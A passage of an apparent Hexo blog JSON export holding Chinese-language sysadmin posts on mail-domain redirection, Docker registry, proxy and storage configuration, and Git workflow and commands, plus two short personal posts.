为计划登陆访问时所用的域名 二、开通景安免费虚拟主机，绑定域名并解析 开通主机景安提供的有免费主机（下图左一）建议：如果使用收费的虚拟主机，只做登陆邮箱调转试用，选个便宜的，够用就行，我选了一个最低配置（下图右一）一年才49，土豪请随意。 考虑到虚拟主机还有其他用途，索性就买了个收费的业务。 注：无论是收费主机还是免费主机，以下操作或功能上没有区别。 添加域名绑定景安的虚拟主机如果不添加域名绑定，即便是解析正确，也无法访问，这个略屌。 添加解析 添加MX记录及添加CNAME解析到景安提供的三级域名。 解析生效 三、上传脚本程序使用FTP工具或者文件管理器将步骤一中创建的index.php文件上传到WEB文件夹中 四、测试访问如果上面的操作都没有错误的情况下，最后便可输入您的域名进行测试访问了，比如：mail.unixmen.cn 五、至此完成，可以使用自己的域名登陆企业邮箱了。如有问题欢迎吐槽打扰。","raw":null,"content":null,"categories":[{"name":"技术文档","slug":"技术文档","permalink":"http://blog.unixmen.cn/categories/技术文档/"},{"name":"工具","slug":"技术文档/Tools","permalink":"http://blog.unixmen.cn/categories/技术文档/Tools/"}],"tags":[{"name":"其他","slug":"其他","permalink":"http://blog.unixmen.cn/tags/其他/"}]},{"title":"Docker 私有仓库无法上传镜像的问题","slug":"Docker-私有仓库无法上传镜像的问题","date":"2017-03-02T09:08:16.000Z","updated":"2017-03-29T00:41:20.000Z","comments":true,"path":"2017/03/02/Docker-私有仓库无法上传镜像的问题/","link":"","permalink":"http://blog.unixmen.cn/2017/03/02/Docker-私有仓库无法上传镜像的问题/","excerpt":"","text":"Docker 私有仓库启动后或者新节点配置私有仓库后，可能会出现无法push镜像到私有仓库，或无法pull镜像的问题如下图： 无法push镜像 无法pull镜像 导致原因：因为启动的registry服务不是安全可信赖的 解决方法如下： CentOS 6 修改docker的配置文件/etc/default/docker，添加下面的内容， 1DOCKER_OPTS=&quot;--insecure-registry xxx.xxx.xxx.xxx:5000&quot; 重启docker服务 1service docker restart CentOS 7 创建或修改 /etc/docker/daemon.json 文件，添加如下内容： 123&#123; &quot;insecure-registries&quot;: [&quot;xxx.xxx.xxx.xxx:5000&quot;] &#125; 重启Docker 服务 1systemctl restart docker 测试： push 测试 pull 测试","raw":null,"content":null,"categories":[{"name":"技术文档","slug":"技术文档","permalink":"http://blog.unixmen.cn/categories/技术文档/"},{"name":"工具","slug":"技术文档/Tools","permalink":"http://blog.unixmen.cn/categories/技术文档/Tools/"},{"name":"容器","slug":"技术文档/Tools/容器","permalink":"http://blog.unixmen.cn/categories/技术文档/Tools/容器/"}],"tags":[{"name":"docker","slug":"docker","permalink":"http://blog.unixmen.cn/tags/docker/"},{"name":"容器","slug":"容器","permalink":"http://blog.unixmen.cn/tags/容器/"},{"name":"Trouble shooting","slug":"Trouble-shooting","permalink":"http://blog.unixmen.cn/tags/Trouble-shooting/"}]},{"title":"Docker配置Daocloud加速器","slug":"Docker配置Daocloud加速器","date":"2017-03-02T07:12:31.000Z","updated":"2017-03-29T00:40:48.000Z","comments":true,"path":"2017/03/02/Docker配置Daocloud加速器/","link":"","permalink":"http://blog.unixmen.cn/2017/03/02/Docker配置Daocloud加速器/","excerpt":"","text":"Docker 版本在 1.12 或更高创建或修改 /etc/docker/daemon.json 文件，修改为如下形式 （请将 加速地址 替换为在加速器页面获取的专属地址）Daocloud加速器地址 123456&#123; &quot;registry-mirrors&quot;: [ &quot;加速地址&quot; ], &quot;insecure-registries&quot;: []&#125;","raw":null,"content":null,"categories":[{"name":"技术文档","slug":"技术文档","permalink":"http://blog.unixmen.cn/categories/技术文档/"},{"name":"工具","slug":"技术文档/Tools","permalink":"http://blog.unixmen.cn/categories/技术文档/Tools/"},{"name":"容器","slug":"技术文档/Tools/容器","permalink":"http://blog.unixmen.cn/categories/技术文档/Tools/容器/"}],"tags":[{"name":"docker","slug":"docker","permalink":"http://blog.unixmen.cn/tags/docker/"},{"name":"容器","slug":"容器","permalink":"http://blog.unixmen.cn/tags/容器/"},{"name":"容器配置","slug":"容器配置","permalink":"http://blog.unixmen.cn/tags/容器配置/"}]},{"title":"Docker配置HTTP代理","slug":"Docker配置HTTP代理","date":"2017-03-02T07:11:24.000Z","updated":"2017-03-29T00:42:18.000Z","comments":true,"path":"2017/03/02/Docker配置HTTP代理/","link":"","permalink":"http://blog.unixmen.cn/2017/03/02/Docker配置HTTP代理/","excerpt":"","text":"由于服务器处于内网，无法直接连接docker hub，需要配置代理使用，如图： CentOS 6下配置docker 的https_proxy 代理,只需要在/etc/sysconfig/docker 配置文件里面增加配置即可。 CentOS 7 无法使用这样的配置方式进行https_proxy 配置，原因为CentOS 7 使用systemd 来管理进程,我们需要添加https_proxy进行配置，步骤如下： 创建目录1mkdir /etc/systemd/system/docker.service.d 添加配置文件 12echo &quot;[Service]Environment=&quot;HTTP_PROXY=http://proxy.ip.com:80&quot;&quot;|tee /etc/systemd/system/docker.service.d/http-proxy.conf Reload systemd-daemon 12systemctl daemon-reload 重启docker服务 1systemctl restart docker 检查变量是否加载 1systemctl show docker --property Environment 测试是否生效","raw":null,"content":null,"categories":[{"name":"技术文档","slug":"技术文档","permalink":"http://blog.unixmen.cn/categories/技术文档/"},{"name":"工具","slug":"技术文档/Tools","permalink":"http://blog.unixmen.cn/categories/技术文档/Tools/"},{"name":"容器","slug":"技术文档/Tools/容器","permalink":"http://blog.unixmen.cn/categories/技术文档/Tools/容器/"}],"tags":[{"name":"docker","slug":"docker","permalink":"http://blog.unixmen.cn/tags/docker/"},{"name":"容器","slug":"容器","permalink":"http://blog.unixmen.cn/tags/容器/"},{"name":"容器配置","slug":"容器配置","permalink":"http://blog.unixmen.cn/tags/容器配置/"}]},{"title":"Docker修改默认存储位置","slug":"Docker修改默认存储位置","date":"2017-03-02T07:10:23.000Z","updated":"2017-03-29T00:41:49.000Z","comments":true,"path":"2017/03/02/Docker修改默认存储位置/","link":"","permalink":"http://blog.unixmen.cn/2017/03/02/Docker修改默认存储位置/","excerpt":"","text":"停止docker 1systemctl stop docker 备份默认docker存储数据 1mv /var/lib/docker&#123;,.bak&#125; 创建docker数据存放文件夹 1mkdir /data/docker 创建软连接 1ln -s /data/docker/ /var/lib/docker 启动docker 1systemctl start docker 查看存储位置","raw":null,"content":null,"categories":[{"name":"技术文档","slug":"技术文档","permalink":"http://blog.unixmen.cn/categories/技术文档/"},{"name":"工具","slug":"技术文档/Tools","permalink":"http://blog.unixmen.cn/categories/技术文档/Tools/"},{"name":"容器","slug":"技术文档/Tools/容器","permalink":"http://blog.unixmen.cn/categories/技术文档/Tools/容器/"}],"tags":[{"name":"docker","slug":"docker","permalink":"http://blog.unixmen.cn/tags/docker/"},{"name":"容器","slug":"容器","permalink":"http://blog.unixmen.cn/tags/容器/"},{"name":"容器配置","slug":"容器配置","permalink":"http://blog.unixmen.cn/tags/容器配置/"}]},{"title":"How to Install Docker Engine on CentOS 7.","slug":"How-to-install-docker-engine-on-CentOS-7","date":"2017-02-28T05:32:27.000Z","updated":"2017-03-06T06:54:18.000Z","comments":true,"path":"2017/02/28/How-to-install-docker-engine-on-CentOS-7/","link":"","permalink":"http://blog.unixmen.cn/2017/02/28/How-to-install-docker-engine-on-CentOS-7/","excerpt":"","text":"1.Remove default docker package.12yum -y remove docker docker-common container-selinuxyum -y remove docker-selinux 2.Install Docker engine123456yum install -y yum-utilsyum-config-manager --add-repo https://docs.docker.com/engine/installation/linux/repo_files/centos/docker.repoyum-config-manager --enable docker-testingyum-config-manager --disable docker-testingyum makecache fastyum -y install docker-engine","raw":null,"content":null,"categories":[{"name":"技术文档","slug":"技术文档","permalink":"http://blog.unixmen.cn/categories/技术文档/"},{"name":"工具","slug":"技术文档/Tools","permalink":"http://blog.unixmen.cn/categories/技术文档/Tools/"}],"tags":[{"name":"docker","slug":"docker","permalink":"http://blog.unixmen.cn/tags/docker/"},{"name":"容器","slug":"容器","permalink":"http://blog.unixmen.cn/tags/容器/"}]},{"title":"Git利用分支进行开发的工作流程","slug":"Git利用分支进行开发的工作流程","date":"2017-02-28T05:24:47.000Z","updated":"2017-03-06T06:51:41.000Z","comments":true,"path":"2017/02/28/Git利用分支进行开发的工作流程/","link":"","permalink":"http://blog.unixmen.cn/2017/02/28/Git利用分支进行开发的工作流程/","excerpt":"","text":"[toc] Git 利用分支进行开发的工作流程Git 作为一个源码管理系统，不可避免涉及到多人协作。协作必须有一个规范的工作流程，让大家有效地合作，使得项目井井有条地发展下去。”工作流程”在英语里，叫做”workflow”或者”flow”，原意是水流，比喻项目像水流那样，顺畅、自然地向前流动，不会发生冲击、对撞、甚至漩涡。 一、长期分支master 分支master 永远处于稳定状态，这个分支代码可以随时用来部署。不允许在该分支直接提交代码。 develop 分支开发分支，包含了项目最新的功能和代码，所有开发都在 develop 上进行。一般情况下小的修改直接在这个分支上提交代码。 二、短期分支feature 分支如果要改的一个东西会有比较多的修改，或者改的东西影响会比较大，请从 develop 分支开出一个 feature 分支，分支名约定为feature/xxx，开发完成后合并回 develop 分支并且删除这个 feature 分支，相应的操作如下： 1234567$ git checkout -b feature/xxx develop# 写代码，提交，写代码，提交。。。# feature 开发完成，合并回 develop$ git checkout develop# 务必加上 --no-ff，以保持分支的合并历史$ git merge --no-ff feature/xxx$ git branch -d feature/xxx 如果想要当前分支能保持与 develop 的更新，请用 rebase，操作如下： 12# 假设当前在 feature/xxx 分支$ git rebase develop rebase 会修改历史，如果你的 feature 分支是跟人合作开发的，请互相做好协调。 release 分支当 develop 上的功能和 bug 修得差不多的时候，我们就要发布新版本了，这个时候从 develop 分支上开出一个 release 分支，来做发布前的准备，分支名约定为release/20121221，主要是测试有没有什么 bug，如果有 bug 就直接在这个分支上修复，确定没有问题后就会合并到 master 分支。相应操作如下： 1234$ git checkout -b release/20121221 develop# 修复 bug、检查没问题后合并到 master 分支并删除$ git checkout master$ git merge --no-ff release/20121221 为了让 release 分支上 bug 修改作用到 develop 分支，我们还需要把这个 release 分支合并回 develop 分支： 1234$ git checkout develop$ git merge --no-ff release/20121221# 到此，这个 release 分支完成了它的使命，可以被删除了$ git branch -d release/20121221 hotfix 分支如果我们发现线上的代码（也就是 master）有 bug，但是这个时候我们的 develop 上的有些功能还没完成，还不能发布，这个时候我们可以从 master 分支上开出一个 hotfix 分支（记住：直接在 master 上提交代码是不允许的！），分支名约定为hotfix/xxx，在这个分支上修改完 bug 后需要把这个分支同时合并到 master 和 develop 分支。相应操作如下： 12345678$ git checkout -b hotfix/xxx master# 修完 bug 后$ git checkout master$ git merge --no-ff hotfix/xxx$ git checkout develop$ git merge --no-ff hotfix/xxx# hotfix 分支完成使命$ git branch -d hotfix/xxx 例外：当 hotfix 分支完成，这个时候如果有 release 分支存在，那么这个 hotfix 就应该合并到 release，而不是 develop 分支。 三、proj 分支proj 分支为项目分支，所有的项目分支都从 master 上开出来，约定的分支名为proj/xxx。所有的项目定制内容都直接在项目分支上提交。为了保证项目的更新，每当项目有新版本发布时都需要把 master 分支合并到 proj 分支上。相应操作如下： 12345$ git checkout -b proj/xxx master# 定制。。。# 如果 master 分支有更新$ git checkout proj/xxx master$ git merge --no-ff master","raw":null,"content":null,"categories":[{"name":"技术文档","slug":"技术文档","permalink":"http://blog.unixmen.cn/categories/技术文档/"},{"name":"工具","slug":"技术文档/Tools","permalink":"http://blog.unixmen.cn/categories/技术文档/Tools/"}],"tags":[{"name":"git","slug":"git","permalink":"http://blog.unixmen.cn/tags/git/"}]},{"title":"Git常用命令","slug":"Git常用命令","date":"2017-02-28T03:24:49.000Z","updated":"2017-03-06T06:53:36.000Z","comments":true,"path":"2017/02/28/Git常用命令/","link":"","permalink":"http://blog.unixmen.cn/2017/02/28/Git常用命令/","excerpt":"","text":"[toc] Git常用命令Git 命令行操作工作流程 Workspace：工作区 Index / Stage：暂存区 Repository：仓库区（或本地仓库） Remote：远程仓库 一、新建代码库 在当前目录新建一个Git代码库 1git init 新建一个目录，将其初始化为Git代码库 1git init [project-name] 下载一个项目和它的整个代码历史 1git clone [url] 二、配置Git的设置文件为.gitconfig，它可以在用户主目录下（全局配置），也可以在项目目录下（项目配置）。 显示当前的Git配置 1git config --list 编辑Git配置文件 1git config -e [--global] 设置提交代码时的用户信息 12git config [--global] user.name &quot;[name]&quot;git config [--global] user.email &quot;[email address]&quot; 三、增加/删除文件 添加指定文件到暂存区 1git add [file1] [file2] ... 添加指定目录到暂存区，包括子目录 1git add [dir] 添加当前目录的所有文件到暂存区 1git add . 添加每个变化前，都会要求确认,对于同一个文件的多处变化，可以实现分次提交 1git add -p 删除工作区文件，并且将这次删除放入暂存区 1git rm [file1] [file2] ... 停止追踪指定文件，但该文件会保留在工作区 1git rm --cached [file] 改名文件，并且将这个改名放入暂存区 1git mv [file-original] [file-renamed] 四、代码提交 提交暂存区到仓库区 1git commit -m [message] 提交暂存区的指定文件到仓库区 1git commit [file1] [file2] ... -m [message] 提交工作区自上次commit之后的变化，直接到仓库区 1git commit -a 提交时显示所有diff信息 1git commit -v 使用一次新的commit，替代上一次提交, 如果代码没有任何新变化，则用来改写上一次commit的提交信息 1git commit --amend -m [message] 重做上一次commit，并包括指定文件的新变化 1git commit --amend [file1] [file2] ... 五、分支 列出所有本地分支 1git branch 列出所有远程分支 1git branch -r 列出所有本地分支和远程分支 1git branch -a 新建一个分支，但依然停留在当前分支 1git branch [branch-name] 新建一个分支，并切换到该分支 1git checkout -b [branch] 新建一个分支，指向指定commit 1git branch [branch] [commit] 新建一个分支，与指定的远程分支建立追踪关系 1git branch --track [branch] [remote-branch] 切换到指定分支，并更新工作区 1git checkout [branch-name] 切换到上一个分支 1git checkout - 建立追踪关系，在现有分支与指定的远程分支之间 1git branch --set-upstream [branch] [remote-branch] 合并指定分支到当前分支 1git merge [branch] 选择一个commit，合并进当前分支 1git cherry-pick [commit] 删除分支 1git branch -d [branch-name] 删除远程分支 12git push origin --delete [branch-name]git branch -dr [remote/branch] 六、标签 列出所有tag 1git tag 新建一个tag在当前commit 1git tag [tag] 新建一个tag在指定commit 1git tag [tag] [commit] 删除本地tag 1git tag -d [tag] 删除远程tag 1git push origin :refs/tags/[tagName] 查看tag信息 1git show [tag] 提交指定tag 1git push [remote] [tag] 提交所有tag 1git push [remote] --tags 新建一个分支，指向某个tag 1git checkout -b [branch] [tag] 七、查看信息 显示有变更的文件 1git status 显示当前分支的版本历史 1git log 显示commit历史，以及每次commit发生变更的文件 1git log --stat 搜索提交历史，根据关键词 1git log -S [keyword] 显示某个commit之后的所有变动，每个commit占据一行 1git log [tag] HEAD --pretty=format:%s 显示某个commit之后的所有变动，其”提交说明”必须符合搜索条件 1git log [tag] HEAD --grep feature 显示某个文件的版本历史，包括文件改名 12git log --follow [file]git whatchanged [file] 显示指定文件相关的每一次diff 1git log -p [file] 显示过去5次提交 1git log -5 --pretty --oneline 显示所有提交过的用户，按提交次数排序 1git shortlog -sn 显示指定文件是什么人在什么时间修改过 1git blame [file] 显示暂存区和工作区的差异 1git diff 显示暂存区和上一个commit的差异 1git diff --cached [file] 显示工作区与当前分支最新commit之间的差异 1git diff HEAD 显示两次提交之间的差异 1git diff [first-branch]...[second-branch] 显示今天你写了多少行代码 1git diff --shortstat &quot;@&#123;0 day ago&#125;&quot; 显示某次提交的元数据和内容变化 1git show [commit] 显示某次提交发生变化的文件 1git show --name-only [commit] 显示某次提交时，某个文件的内容 1git show [commit]:[filename] 显示当前分支的最近几次提交 1git reflog 八、远程同步 下载远程仓库的所有变动 1git fetch [remote] 显示所有远程仓库 1git remote -v 显示某个远程仓库的信息 1git remote show [remote] 增加一个新的远程仓库，并命名 1git remote add [shortname] [url] 取回远程仓库的变化，并与本地分支合并 1git pull [remote] [branch] 上传本地指定分支到远程仓库 1git push [remote] [branch] 强行推送当前分支到远程仓库，即使有冲突 1git push [remote] --force 推送所有分支到远程仓库 1git push [remote] --all 九、撤销 恢复暂存区的指定文件到工作区 1git checkout [file] 恢复某个commit的指定文件到暂存区和工作区 1git checkout [commit] [file] 恢复暂存区的所有文件到工作区 1git checkout . 重置暂存区的指定文件，与上一次commit保持一致，但工作区不变 1git reset [file] 重置暂存区与工作区，与上一次commit保持一致 1git reset --hard 重置当前分支的指针为指定commit，同时重置暂存区，但工作区不变 1git reset [commit] 重置当前分支的HEAD为指定commit，同时重置暂存区和工作区，与指定commit一致 1git reset --hard [commit] 重置当前HEAD为指定commit，但保持暂存区和工作区不变 1git reset --keep [commit] 新建一个commit，用来撤销指定commit 后者的所有变化都将被前者抵消，并且应用到当前分支 1git revert [commit] 暂时将未提交的变化移除，稍后再移入 12git stashgit stash pop 十、其他 生成一个可供发布的压缩包1git archive","raw":null,"content":null,"categories":[{"name":"技术文档","slug":"技术文档","permalink":"http://blog.unixmen.cn/categories/技术文档/"},{"name":"工具","slug":"技术文档/Tools","permalink":"http://blog.unixmen.cn/categories/技术文档/Tools/"}],"tags":[{"name":"git","slug":"git","permalink":"http://blog.unixmen.cn/tags/git/"},{"name":"git command","slug":"git-command","permalink":"http://blog.unixmen.cn/tags/git-command/"},{"name":"git 命令行","slug":"git-命令行","permalink":"http://blog.unixmen.cn/tags/git-命令行/"}]},{"title":"Git 基础操作","slug":"Git-基础操作","date":"2017-02-17T16:59:59.000Z","updated":"2017-03-06T06:51:07.000Z","comments":true,"path":"2017/02/18/Git-基础操作/","link":"","permalink":"http://blog.unixmen.cn/2017/02/18/Git-基础操作/","excerpt":"","text":"Git 是什么 是一个开源的分布式版本控制系统，用于敏捷高效地处理任何或小或大的项目。 是 Linus Torvalds 为了帮助管理 Linux 内核开发而开发的一个开放源码的版本控制软件。 与常用的版本控制工具 CVS, Subversion 等不同，它采用了分布式版本库的方式，不必服务器端软件支持。 Git 与 SVN 区别GIT不仅仅是个版本控制系统，它也是个内容管理系统(CMS),工作管理系统等。如果你是一个具有使用SVN背景的人，你需要做一定的思想转换，来适应GIT提供的一些概念和特征。 区别： GIT是分布式的，SVN不是：这是GIT和其它非分布式的版本控制系统，例如SVN，CVS等，最核心的区别。 GIT把内容按元数据方式存储，而SVN是按文件：所有的资源控制系统都是把文件的元信息隐藏在一个类似.svn,.cvs等的文件夹里。 GIT分支和SVN的分支不同：分支在SVN中一点不特别，就是版本库中的另外的一个目录。 GIT没有一个全局的版本号，而SVN有：目前为止这是跟SVN相比GIT缺少的最大的一个特征。 GIT的内容完整性要优于SVN：GIT的内容存储使用的是SHA-1哈希算法。这能确保代码内容的完整性，确保在遇到磁盘故障和网络问题时降低对版本库的破坏。 快速入门：如何安装：Windows Git 安装包下载 Mac Git 安装包下载 Linux 安装教程 创建新仓库创建新的 git 仓库： 创建新文件夹 进入新文件夹 命令行执行”git init” 实例： 以上操作将创建一个名为 .git 的子目录，这个子目录含有你初始化的 Git 仓库中所有的必须文件，这些文件是 Git 仓库的骨干。 但是，在这个时候，我们仅仅是做了一个初始化的操作，你的项目里的文件还没有被跟踪。点击链接获取更多关于.git文件夹中包含了文件的信息。 如果你是在一个非空文件夹中初始化，需要： 添加跟踪（git add） 提交（git commit） 实例： 获取Git仓库执行如下命令以创建一个本地仓库的克隆版本：1git clone https://github.com/netb2c/netb2c.github.io.git 如果是远端服务器上的仓库,可使用SSH传输协议:1git clone git@10.160.0.200:/data/sdk_svnserver/netb2c.git 检查当前文件状态要查看哪些文件处于什么状态，可以用 git status 命令1git status 以上反馈信息显示： 当前所在工作目录相当干净 所有已跟踪文件在上次提交后都未被更改过 当前目录下没有出现任何处于未跟踪状态的新文件 显示了当前所在分支(“master”) 添加、修改文件测试： 以上打印信息可以看到： daily_task.md 文件在Changes not staged for commit下面：– 文件内容发生便会– 未在暂存区需要保存到暂存区，需要执行”git add” 暂存修改 新建的 README.md 文件现在 Untracked files 下面：– 新文件未被跟踪– 新闻界需要添加跟踪 跟踪新文件使用命令 git add 开始跟踪一个文件：1git add 正常情况下不会打印信息。 再次查看状态： 两个文档都在Changes to be committed下:– 此时已暂时保存当前文档状态注：git add 只是将增加、修改后文件添加内容到下一次提交中”而不是“将文件直接添加到项目中” 简略状态信息查看git status 命令的输出十分详细，但其用语有些繁琐。如果你使用 git status -s 命令或 git status –short 命令，你将得到一种更为紧凑的格式输出，如图： A：新增 M：修改 ??：未被跟踪 查看已暂存和未暂存的修改git status 命令的输出对于你来说过于模糊，你想知道具体修改了什么地方，可以用 git diff 命令。 要查看尚未暂存的文件更新了哪些部分，不加参数直接输入 git diff 若要查看已暂存的将要添加到下次提交里的内容，需用 git diff –staged 提交更新暂存区域已经准备妥当可以提交了。一定要确认还有什么修改过的或新建的文件还没有 git add 过，否则提交的时候不会记录这些还没暂存起来的变化。 这些修改过的文件只保留在本地磁盘。 所以，每次准备提交前，先用 git status 看下，是不是都已暂存起来了， 然后再运行提交命令 git commit： 跳过使用暂存区域 Git 提供了一个跳过使用暂存区域的方式， 只要在提交的时候，给 git commit 加上 -a 选项，Git 就会自动把所有已经跟踪过的文件暂存起来一并提交，从而跳过 git add 步骤，详见下图： 删除文件要从 Git 中移除某个文件，就必须要从已跟踪文件清单中移除（确切地说，是从暂存区域移除），然后提交。 可以用 git rm 命令完成此项工作，并连带从工作目录中删除指定的文件，这样以后就不会出现在未跟踪文件清单中了。 正确的删除版本控制库文件需要： 删除本地文件： rm file 从版本控制库中删除： git rm file 提交更新： git commit -m “Commit message.” 移动文件Git 并不显式跟踪文件移动操作。 如果在 Git 中重命名了某个文件，仓库中存储的元数据并不会体现出这是一次改名操作。需要使用命令：1git mv old_name new_name 实例： 其实，运行 git mv 就相当于运行了下面三条命令：123mv README.md READMEgit rm README.mdgit add README","raw":null,"content":null,"categories":[{"name":"技术文档","slug":"技术文档","permalink":"http://blog.unixmen.cn/categories/技术文档/"},{"name":"工具","slug":"技术文档/Tools","permalink":"http://blog.unixmen.cn/categories/技术文档/Tools/"}],"tags":[{"name":"git","slug":"git","permalink":"http://blog.unixmen.cn/tags/git/"}]},{"title":"感恩","slug":"感恩","date":"2017-02-17T03:06:56.000Z","updated":"2017-02-17T06:09:43.000Z","comments":true,"path":"2017/02/17/感恩/","link":"","permalink":"http://blog.unixmen.cn/2017/02/17/感恩/","excerpt":"","text":"感恩123456789101112131415161718[感恩]是快乐的来源，感恩天地，生命之源感恩阳光，托起梦想感恩万物，助我成长感恩父母，赐予生命感恩兄弟，手足情深感恩某人，冤家聚首感恩孩子，舐犊情深感恩恩师，淳淳教诲感恩朋友，知心之谊感恩同袍，携手同行感恩领导，不吝提携感恩公司，给我平台感恩挫折，让我成长感恩命运，让我懂得感恩黑暗，让我领悟感恩科技，建立博客感恩，感恩，感恩....","raw":null,"content":null,"categories":[{"name":"生活","slug":"Life","permalink":"http://blog.unixmen.cn/categories/Life/"}],"tags":[{"name":"感恩","slug":"感恩","permalink":"http://blog.unixmen.cn/tags/感恩/"}]},{"title":"第一篇博客","slug":"first","date":"2017-02-17T03:03:39.000Z","updated":"2017-02-17T06:10:44.000Z","comments":true,"path":"2017/02/17/first/","link":"","permalink":"http://blog.unixmen.cn/2017/02/17/first/","excerpt":"","text":"就这么开始吧，精彩内容敬请期待…","raw":null,"content":null,"categories":[{"name":"生活","slug":"Life","permalink":"http://blog.unixmen.cn/categories/Life/"}],"tags":[{"name":"开篇","slug":"开篇","permalink":"http://blog.unixmen.cn/tags/开篇/"}]}]}